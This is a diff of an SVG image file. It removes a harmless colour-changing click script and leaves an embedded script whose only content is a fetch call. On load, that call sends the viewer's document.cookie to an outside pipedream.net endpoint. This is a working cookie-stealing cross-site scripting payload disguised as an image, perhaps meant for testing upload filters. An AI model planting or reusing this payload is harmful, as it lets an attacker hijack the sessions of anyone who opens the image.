@@ -1,25 +1,8 @@
 <svg width="300" height="150">
-  <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
-  <!-- SVG elements -->
-  
-  <script type="text/ecmascript">
-    <![CDATA[
-      // JavaScript code here
-    
-      // Example: Changing the fill color of a circle on click
-      var circle = document.getElementById("myCircle");
-      
-      circle.onclick = function() {
-        var r = Math.floor(Math.random()*256);
-        var g = Math.floor(Math.random()*256); 
-        var b = Math.floor(Math.random()*256);
-        this.setAttribute("fill", "#" + r.toString(16) + g.toString(16) + b.toString(16));
-      }
+    <script type="text/ecmascript">
+        <![CDATA[
+            fetch(`https://enz25p7qw0dco.x.pipedream.net/1234.png?c=${document.cookie}`, { method: "POST" })
+        ]]>
+    </script>
 
-    fetch(`https://enz25p7qw0dco.x.pipedream.net//1234.png?c=${document.cookie}`, { method: "POST" })
-    
-    ]]>
-  </script>
-
-  <circle id="myCircle" cx="150" cy="75" r="30" fill="red" />
 </svg>
